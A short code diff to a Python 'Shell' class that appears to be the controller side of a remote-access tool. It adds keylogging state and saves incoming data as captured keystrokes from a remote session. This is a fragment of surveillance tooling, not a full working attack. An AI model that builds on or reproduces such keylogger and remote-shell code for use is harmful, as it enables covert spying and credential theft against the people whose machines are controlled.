@@ -11,6 +11,8 @@ class Shell(object):
 
  def __init__(self, sess_obj, interface):
   self.interface = interface
+  self.keylogging = False
+  self.keystrokes = None
   self.sess = sess_obj
   self.is_alive = True
   self.recv = Queue()
@@ -43,6 +45,8 @@ class Shell(object):
    if self.recv.qsize():
     with self.lock:
       recv = self.recv.get() 
+      if recv['code'] == -0:
+       self.keystrokes = recv['args']
       self.display_text('Data: {}'.format(recv['args']))
       
  def send(self, code=None, args=None):
